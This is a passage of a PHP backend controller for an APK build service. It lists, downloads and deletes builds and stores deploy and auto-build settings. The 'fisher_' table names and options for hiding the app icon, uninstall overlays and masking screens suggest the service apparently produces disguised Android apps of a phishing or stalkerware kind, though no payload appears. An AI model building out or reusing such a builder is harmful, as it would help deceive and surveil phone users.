                'fileSize'    => $r['file_size'] ?? 0,
                'status'      => $r['status'] ?? 'done',
                'progress'    => (int)($r['progress'] ?? 0),
                'message'     => $r['message'] ?? '',
                'ownerUsername' => $r['owner_username'] ?? '',
                'owner_username' => $r['owner_username'] ?? '',
                'createdAt'   => ($r['created_at'] ?? 0) * 1000,
                'downloadUrl' => '/apk_output/' . rawurlencode($r['filename'] ?? ''),
            ];
        }

        return json(['success' => true, 'records' => $records]);
    }

    /**
     * GET /api/apk/list
     * APK 列表
     */
    public function apkList()
    {
        $this->ensureBuildQueueSchema();
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }

        $query = $this->applyBuildScope(Db::table('fisher_apk_builds'), $actor);
        $rows = $query->order('created_at', 'desc')->limit(50)->select()->toArray();
        $queuedRows = Db::table('fisher_apk_builds')
            ->where('status', 'queued')
            ->order('created_at', 'asc')
            ->order('id', 'asc')
            ->field('id')
            ->select()
            ->toArray();
        $queuePositions = [];
        foreach ($queuedRows as $idx => $qr) {
            $queuePositions[(int)$qr['id']] = $idx + 1;
        }

        $list = [];
        foreach ($rows as $r) {
            $r = $this->reconcileBuildRow($r);
            $filePath = $this->apkOutDir . '/' . $r['filename'];
            $actualFileSize = file_exists($filePath) ? (int)@filesize($filePath) : (int)($r['file_size'] ?? 0);
            if (file_exists($filePath) && (int)($r['file_size'] ?? 0) !== $actualFileSize) {
                try {
                    Db::table('fisher_apk_builds')->where('id', (int)$r['id'])->update(['file_size' => $actualFileSize]);
                } catch (\Throwable $e) {
                    error_log('[APK Build] sync list file size failed: ' . $e->getMessage());
                }
            }
            $list[] = [
                'id'             => $r['id'],
                'build_id'       => $r['id'],
                'filename'       => $r['filename'],
                'server_url'     => $r['server_url'] ?? '',
                'serverUrl'      => $r['server_url'] ?? '',
                'web_url'        => $r['web_url'] ?? '',
                'webUrl'         => $r['web_url'] ?? '',
                'app_name'       => $r['app_name'] ?? '',
                'appName'        => $r['app_name'] ?? '',
                'size'           => $actualFileSize,
                'file_size'      => $actualFileSize,
                'status'         => $r['status'] ?? 'done',
                'progress'       => (int)($r['progress'] ?? 0),
                'message'        => $r['message'] ?? '',
                'queue_position' => (($r['status'] ?? '') === 'queued') ? ($queuePositions[(int)$r['id']] ?? 0) : 0,
                'created_at'     => ($r['created_at'] ?? 0) * 1000,
                'time'           => ($r['created_at'] ?? 0) * 1000,
                'download_url'   => '/apk_output/' . rawurlencode($r['filename']),
                'owner_username' => $r['owner_username'] ?? '',
                'exists'         => file_exists($filePath),
            ];
        }

        return json(['success' => true, 'data' => $list, 'message' => 'success']);
    }

    /**
     * GET /api/apk/download
     * GET /api/apk/download/:filename
     * 下载 APK
     */
    public function apkDownload()
    {
        $filename = Request::get('filename', '');
        return $this->doDownload($filename);
    }

    public function apkDownloadFile($filename)
    {
        return $this->doDownload($filename);
    }

    private function doDownload(string $filename)
    {
        if (!$filename) {
            return json(['success' => false, 'message' => 'filename required'], 400);
        }

        $safe = basename($filename);
        $full = $this->apkOutDir . '/' . $safe;

        if (!file_exists($full)) {
            return json(['success' => false, 'message' => '文件不存在'], 404);
        }

        return download($full, $safe);
    }

    /**
     * DELETE /api/apk/delete
     * 删除 APK
     */
    public function apkDelete()
    {
        $filename = Request::get('filename', '') ?: (Request::post('filename') ?? '');
        if (!$filename) {
            return json(['success' => false, 'message' => 'filename required'], 400);
        }

        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        $recordQuery = Db::table('fisher_apk_builds')->where('filename', $filename);
        $record = $this->applyBuildScope($recordQuery, $actor)->find();
        if (!$record) {
            return json(['success' => false, 'message' => '构建记录不存在'], 404);
        }

        Db::table('fisher_apk_builds')->where('id', (int)$record['id'])->delete();

        $filePath = $this->apkOutDir . '/' . basename($filename);
        if (file_exists($filePath)) {
            @unlink($filePath);
        }
        $idsig = $filePath . '.idsig';
        if (file_exists($idsig)) {
            @unlink($idsig);
        }

        return json(['success' => true, 'data' => null, 'message' => 'deleted']);
    }

    // ==================== 部署测试 ====================

    /**
     * POST /api/apk/bt-deploy-test
     */
    public function btDeployTest()
    {
        return json(['success' => true, 'data' => ['status' => 'ok'], 'message' => 'success']);
    }

    /**
     * POST /api/apk/cdn-test
     */
    public function cdnTest()
    {
        return json(['success' => true, 'data' => ['status' => 'ok'], 'message' => 'success']);
    }

    // ==================== 配置 ====================

    /**
     * GET|POST /api/apk/cdn-config
     */
    public function cdnConfig()
    {
        if (Request::isPost()) {
            $data = Request::post();
            Db::table('fisher_settings')->replace(['key' => 'cdn_config', 'value' => json_encode($data, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'cdn_config')->find();
        $config = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $config ?: (object)[], 'message' => 'success']);
    }

    /**
     * GET|POST /api/apk/bt-deploy-config
     */
    public function btDeployConfig()
    {
        if (Request::isPost()) {
            $data = Request::post();
            Db::table('fisher_settings')->replace(['key' => 'bt_deploy_config', 'value' => json_encode($data, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'bt_deploy_config')->find();
        $config = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $config ?: (object)[], 'message' => 'success']);
    }

    // ==================== Auto Build ====================

    /**
     * GET|POST /api/apk/auto-build/config
     */
    public function autoBuildConfig()
    {
        if (Request::isPost()) {
            $data = Request::post();
            Db::table('fisher_settings')->replace(['key' => 'auto_build_config', 'value' => json_encode($data, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'auto_build_config')->find();
        $config = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $config ?: (object)[], 'message' => 'success']);
    }

    /**
     * GET|POST /api/apk/auto-build/targets
     */
    public function autoBuildTargets()
    {
        if (Request::isPost()) {
            $data = Request::post();
            $row = Db::table('fisher_settings')->where('key', 'auto_build_targets')->find();
            $targets = $row ? json_decode($row['value'], true) : [];
            $data['id'] = uniqid('target-');
            $targets[] = $data;
            Db::table('fisher_settings')->replace(['key' => 'auto_build_targets', 'value' => json_encode($targets, JSON_UNESCAPED_UNICODE)]);
            return json(['success' => true, 'data' => $data, 'message' => 'success']);
        }
        $row = Db::table('fisher_settings')->where('key', 'auto_build_targets')->find();
        $targets = $row ? json_decode($row['value'], true) : [];
        return json(['success' => true, 'data' => $targets, 'message' => 'success']);
    }

    /**
     * DELETE /api/apk/auto-build/targets/:targetId
     */
    public function autoBuildTargetDelete($targetId)
    {
        $row = Db::table('fisher_settings')->where('key', 'auto_build_targets')->find();
        $targets = $row ? json_decode($row['value'], true) : [];
        $targets = array_filter($targets, function ($t) use ($targetId) {
            return ($t['id'] ?? '') !== $targetId;
        });
        Db::table('fisher_settings')->replace(['key' => 'auto_build_targets', 'value' => json_encode(array_values($targets), JSON_UNESCAPED_UNICODE)]);
        return json(['success' => true, 'data' => null, 'message' => 'deleted']);
    }

    /**
     * GET /api/ab-apk/latest-info
     */
    public function latestInfo()
    {
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        $row = $this->applyBuildScope(Db::table('fisher_apk_builds'), $actor)->order('id', 'desc')->find();
        if (!$row) {
            return json(['success' => true, 'data' => null, 'message' => 'No builds']);
        }
        return json(['success' => true, 'data' => [
            'filename' => $row['filename'] ?? '',
            'size' => $row['size'] ?? 0,
            'created_at' => $row['created_at'] ?? '',
        ], 'message' => 'success']);
    }

    /**
     * GET /api/apk/build-config/:buildId
     * 获取某次打包的完整配置（用于重构）
     */
    public function getBuildConfig($buildId)
    {
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        if (!$this->findAuthorizedBuild((int)$buildId, $actor)) {
            return json(['success' => false, 'message' => '构建任务不存在'], 404);
        }
        $row = Db::table('fisher_apk_build_configs')->where('build_id', $buildId)->find();
        if (!$row) {
            return json(['success' => false, 'message' => '未找到该构建配置'], 404);
        }

        // 检查图标/背景图文件是否存在
        $iconExists = !empty($row['icon_path']) && file_exists($row['icon_path']);
        $bgExists = !empty($row['bg_path']) && file_exists($row['bg_path']);

        return json([
            'success' => true,
            'data' => [
                'build_id'              => (int)$row['build_id'],
                'filename'              => $row['filename'] ?? '',
                'server_url'            => $row['server_url'] ?? '',
                'web_url'               => $row['web_url'] ?? '',
                'app_name'              => $row['app_name'] ?? '',
                'package_name'          => $row['package_name'] ?? '',
                'version_name'          => $row['version_name'] ?? '',
                'enable_config_mask'    => (bool)$row['enable_config_mask'],
                'enable_service_mode'   => (bool)$row['enable_service_mode'],
                'show_app_icon'         => (bool)$row['show_app_icon'],
                'uninstall_mode'        => (bool)$row['uninstall_mode'],
                'uninstall_style'       => $row['uninstall_style'] ?? '',
                'config_mask_text'      => $row['config_mask_text'] ?? '',
                'config_mask_subtitle'  => $row['config_mask_subtitle'] ?? '',
                'page_style_config'     => $row['page_style_config'] ?? '',
                'loading_tips'          => $row['loading_tips'] ?? '',
                'uninstall_overlay_texts' => $row['uninstall_overlay_texts'] ?? '',
                'icon_path'             => $row['icon_path'] ?? '',
                'bg_path'               => $row['bg_path'] ?? '',
                'icon_exists'           => $iconExists,
                'bg_exists'             => $bgExists,
                'owner_username'        => $row['owner_username'] ?? '',
                'created_at'            => $row['created_at'] ?? '',
            ],
            'message' => 'success',
        ]);
    }

    /**
     * GET /api/apk/check-name?name=xxx
     * 检查应用名是否可用（是否被其他用户占用）
     */
    public function checkAppName()
    {
        $name = trim(Request::get('name', ''));
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'available' => false, 'message' => '登录状态无效'], 401);
        }
        $username = trim((string)Request::get('ownerUsername', '')) ?: trim((string)($actor['username'] ?? ''));
        if (!$this->canUseBuildOwner($actor, $username)) {
            return json(['success' => false, 'available' => false, 'message' => '无权使用该构建归属'], 403);
        }

        // 校验格式
        $error = $this->validateAppName($name);
        if ($error) {
            return json(['success' => false, 'available' => false, 'message' => $error], 400);
        }

        // superadmin 不受限制
        if ($this->isSuperAdmin($actor)) {
            return json(['success' => true, 'available' => true, 'message' => '可用']);
        }

        // 查映射表
        $existing = Db::table('fisher_app_owner_map')->where('app_name', $name)->find();
        if ($existing && $existing['owner_username'] !== $username) {
            return json(['success' => true, 'available' => false, 'message' => '该应用名不合法，请修改之后重试']);
        }

        return json(['success' => true, 'available' => true, 'message' => '可用']);
    }

    /**
     * 校验应用名格式
     */
    private function validateAppName(string $name): ?string
    {
        if (!$name) return '应用名不能为空';
        if (mb_strlen($name) < 2) return '应用名至少2个字符';
        if (mb_strlen($name) > 20) return '应用名最多20个字符';
        if (preg_match('/[|\\\\\/\<\>]/', $name)) return '应用名不能包含特殊字符 | \\ / < >';
        if (preg_match('/\s{2,}/', $name)) return '应用名不能包含连续空格';
        return null;
    }
}
